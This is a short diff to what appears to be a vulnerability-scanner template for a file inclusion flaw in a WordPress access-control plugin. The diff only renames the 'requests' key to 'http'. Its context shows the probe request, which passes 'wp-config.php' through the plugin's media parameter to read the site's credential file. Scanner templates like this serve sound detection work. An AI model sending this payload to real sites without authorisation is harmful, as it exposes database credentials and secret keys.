@@ -10,7 +10,7 @@ info:
     - https://id.wordpress.org/plugins/advanced-access-manager/
   tags: wordpress,wp-plugin,lfi
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/?aam-media=wp-config.php'
